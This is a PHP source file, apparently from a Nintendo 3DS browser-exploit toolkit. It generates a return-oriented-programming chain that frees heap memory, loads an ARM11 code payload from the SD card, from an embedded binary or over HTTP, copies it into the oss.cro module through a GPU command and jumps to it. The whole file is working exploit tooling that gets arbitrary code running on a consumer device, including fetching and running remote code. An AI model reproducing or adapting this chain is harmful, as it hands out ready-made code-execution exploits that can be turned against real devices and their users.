function generateropchain_type2()
{
	global $ROPHEAP, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, /*$IFile_Seek,*/ $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd, $browserver, $FS_MOUNTSDMC, $ROP_snprintf, $ROP_curl_easy_cleanup, $ROP_curl_easy_init, $ROP_curl_easy_perform, $ROP_curl_easy_setopt;

	$LINEAR_TMPBUF = 0x18B40000;
	$LINEAR_VADDRBASE = 0x14000000;
	if($browserver >= 0x80)
	{
		$LINEAR_TMPBUF = 0x3A45C000;
		$LINEAR_VADDRBASE = 0x30000000;
	}

	$LINEAR_CODETMPBUF = $LINEAR_TMPBUF + 0x1000;
	$OSSCRO_PHYSADDR = ($OSSCRO_HEAPADR - 0x08000000) + $APPHEAP_PHYSADDR;
	$LINEARADR_OSSCRO = ($OSSCRO_PHYSADDR - 0x20000000) + $LINEAR_VADDRBASE;
	$LINEARADR_CODESTART = $LINEARADR_OSSCRO + 0x6e0;
	$CODESTART_MAPADR = $OSSCRO_MAPADR + 0x6e0;

	$codebinsize = 0x8000;

	$IFile_ctx = $ROPHEAP;

	ropgen_writeu32($ROPHEAP, 0x0100FFFF, 0, 1);
	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that yellow is displayed.

	ropgen_callfunc($LINEAR_TMPBUF, 0x11000, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);

	if($arm11code_loadfromsd>=1 && $browserver>=0x80)//Open sdmc archive when running under SKATER.
	{
		ropgen_writeu32($ROPHEAP, 0x636d6473, 0, 1);
		ropgen_writeu32($ROPHEAP+4, 0x3a, 0, 1);
		ropgen_callfunc($ROPHEAP, 0x0, 0x0, 0x0, $POPPC, $FS_MOUNTSDMC);
		ropgen_condfatalerr();
	}

	if($browserver>=0x80)
	{
		ropchain_appendu32($POPLRPC);
		ropchain_appendu32($ROP_POP_R0R6PC);

		ropchain_appendu32($ROP_POP_R0R6PC);
		ropchain_appendu32($ROPHEAP);//r0 outaddr
		ropchain_appendu32(0x0a000000);//r1 addr0
		ropchain_appendu32(0x0);//r2 addr1
		ropchain_appendu32(0x800000);//r3 size
		ropchain_appendu32(0x0);//r4
		ropchain_appendu32(0x0);//r5
		ropchain_appendu32(0x0);//r6

		ropchain_appendu32($svcControlMemory);//Free 8MB of heap under SKATER.

		ropchain_appendu32(0x1);//sp0 operation
		ropchain_appendu32(0x0);//sp4 permissions
		ropchain_appendu32(0x0);//sp8
		ropchain_appendu32(0x8);//sp12
		ropchain_appendu32(0x0);//r4
		ropchain_appendu32(0x0);//r5
		ropchain_appendu32(0x0);//r6
	}

	if($arm11code_loadfromsd==0)
	{
		$data_arr = getcodebin_array(browserhaxcfg_getbinpath_ropchain2(), 0x540);
	
		ropgen_writeregdata_wrap($LINEAR_CODETMPBUF, $data_arr, 0, 0x540);
	}
	else if($arm11code_loadfromsd==1)
	{
		ropgen_callfunc($IFile_ctx, 0x14, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);//Clear the IFile ctx.

		/*$databuf = array();
		$databuf[0] = 0x640073;
		$databuf[1] = 0x63006d;
		$databuf[2] = 0x2f003a;
		$databuf[3] = 0x720061;
		$databuf[4] = 0x31006d;
		$databuf[5] = 0x630031;
		$databuf[6] = 0x64006f;
		$databuf[7] = 0x2e0065;
		$databuf[8] = 0x690062;
		$databuf[9] = 0x6e;*/

		$databuf = string_gendata_array("sdmc:/arm11code.bin", 1, 0x40);

		ropgen_writeregdata_wrap($ROPHEAP+0x40, $databuf, 0, 0x28);//Write the following utf16 string to ROPHEAP+0x40: "sdmc:/arm11code.bin".

		ropgen_callfunc($IFile_ctx, $ROPHEAP+0x40, 0x1, 0x0, $POPPC, $IFile_Open);//Open the above file.
		//ropchain_appendu32(0x50505050);
		ropgen_condfatalerr();

		ropgen_callfunc($IFile_ctx, $ROPHEAP+0x20, $LINEAR_CODETMPBUF, $codebinsize, $POPPC, $IFile_Read);//Read the file to $LINEAR_CODETMPBUF with size $codebinsize, actual size must be <=$codebinsize.
		//ropchain_appendu32(0x40404040);
		ropgen_condfatalerr();

		ropgen_readu32($IFile_ctx, 0, 1);

		ropchain_appendu32($POPLRPC);
		ropchain_appendu32($POPPC);//lr
		ropchain_appendu32($ROP_POP_R1R5PC);

		ropchain_appendu32(0x0);//r1
		ropchain_appendu32(0x0);//r2
		ropchain_appendu32(0x0);//r3
		ropchain_appendu32(0x0);//r4
		ropchain_appendu32(0x0);//r5
		ropchain_appendu32($IFile_Close);
	}
	else if($arm11code_loadfromsd==2)
	{
		ropgen_httpdownload_binary($LINEAR_CODETMPBUF, $codebinsize, browserhaxcfg_getbinparam_type3());
	}

	ropgen_callfunc($LINEAR_CODETMPBUF, $codebinsize, 0x0, 0x0, $POPPC, $GSP_FLUSHDCACHE);//Flush the data-cache for the loaded code.

	if(!isset($SRVPORT_HANDLEADR))$SRVPORT_HANDLEADR = 0x0;
	if(!isset($SRV_REFCNT))$SRV_REFCNT = 0x0;
	if(!isset($srvpm_initialize))$srvpm_initialize = 0x0;
	if(!isset($srv_shutdown))$srv_shutdown = 0x0;
	if(!isset($ROP_snprintf))$ROP_snprintf = 0x0;

	$databuf = array();
	$databuf[0] = 0x0;
	$databuf[1] = $THROW_FATALERR;
	$databuf[2] = $SRVPORT_HANDLEADR;
	$databuf[3] = $SRV_REFCNT;
	$databuf[4] = $srvpm_initialize;
	$databuf[5] = $srv_shutdown;
	$databuf[6] = $srv_GetServiceHandle;
	$databuf[7] = $GXLOW_CMD4;
	$databuf[8] = $GSP_FLUSHDCACHE;
	$databuf[9] = $IFile_Open;
	$databuf[10] = $IFile_Close;
	$databuf[11] = $IFile_GetSize;
	$databuf[12] = 0;//$IFile_Seek;
	$databuf[13] = $IFile_Read;
	$databuf[14] = $IFile_Write;
	$databuf[15] = $GSP_WRITEHWREGS;
	$databuf[16] = 0;//$APT_PrepareToDoApplicationJump;
	$databuf[17] = 0;//$APT_DoApplicationJump;
	if($browserver<0x80)$databuf[18] = 0x40;//flags
	if($browserver>=0x80)$databuf[18] = 0x48;
	$databuf[19] = 0x0;
	$databuf[20] = 0x0;
	$databuf[21] = 0x0;
	$databuf[22] = $GSPGPU_SERVHANDLEADR;//GSPGPU handle*
	$databuf[23] = 0x114;//NS appID
	$databuf[24] = 0;
	$databuf[25] = $LINEAR_CODETMPBUF;
	$databuf[26] = $ROP_snprintf;
	$databuf[27] = $ROP_curl_easy_cleanup;//Using these libcurl functions from the arm11code payload is not recommended: these are broken due to the payload overwriting oss.cro.
	$databuf[28] = $ROP_curl_easy_init;
	$databuf[29] = $ROP_curl_easy_perform;
	$databuf[30] = $ROP_curl_easy_setopt;

	ropgen_writeregdata_wrap($LINEAR_TMPBUF, $databuf, 0, 31*4);

	ropchain_appendu32($POPLRPC);
	ropchain_appendu32($ROP_POP_R0R6PC);

	ropchain_appendu32($ROP_POP_R0R6PC);
	ropchain_appendu32($LINEAR_CODETMPBUF);//r0 srcaddr
	ropchain_appendu32($LINEARADR_CODESTART);//r1 dstaddr
	ropchain_appendu32($codebinsize);//r2 size
	ropchain_appendu32(0x0);//r3 width0
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($GXLOW_CMD4);//Copy the loaded code to the start of the CRO.

	ropchain_appendu32(0x0);//sp0 height0
	ropchain_appendu32(0x0);//sp4 width1
	ropchain_appendu32(0x0);//sp8 height1
	ropchain_appendu32(0x8);//sp12 flags 
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($POPLRPC);//Delay 1 second while the above copy-command is being processed, then jump to that code.
	ropchain_appendu32($POPPC);

	ropchain_appendu32($ROP_POP_R0R6PC);
	ropchain_appendu32(1000000000);//r0
	ropchain_appendu32(0x0);//r1
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($svcSleepThread);

	ropgen_writeu32($ROPHEAP, 0x01808080, 0, 1);
	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $ROP_POP_R0R6PC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that gray is displayed.

	ropchain_appendu32($LINEAR_TMPBUF);//r0
	ropchain_appendu32(0x10000000-0x7000);//r1 (relocated stack-top if needed by the payload)
	ropchain_appendu32(0x0);//r2
	ropchain_appendu32(0x0);//r3
	ropchain_appendu32(0x0);//r4
	ropchain_appendu32(0x0);//r5
	ropchain_appendu32(0x0);//r6

	ropchain_appendu32($POPLRPC);
	ropchain_appendu32($POPPC);

	ropchain_appendu32($CODESTART_MAPADR);

	ropchain_appendu32(0x70707070);
}
